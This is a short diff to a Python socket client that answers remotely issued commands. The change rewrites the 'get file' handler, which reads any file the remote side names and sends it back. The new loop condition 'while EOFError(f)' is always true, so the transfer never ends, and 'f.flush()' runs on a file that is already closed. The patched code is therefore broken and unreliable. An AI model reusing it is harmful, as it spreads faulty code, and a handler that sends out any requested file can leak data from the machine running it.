@@ -24,11 +24,11 @@ def client():
         elif 'get file' in data:
             data = data.replace('get file ', '')
             with open(data, 'rb') as f:
-                for line in f.readlines():
+                while EOFError(f):
                     if s.recv(1024).decode('utf-8') == 'ok':
-                        s.sendall(line)
-                s.sendall('complete'.encode('utf-8'))
-
+                        s.sendall(f.read(1024))
+            s.sendall('complete'.encode('utf-8'))
+            f.flush()
         else:
             s.send('The command was not found'.encode('utf-8'))
 
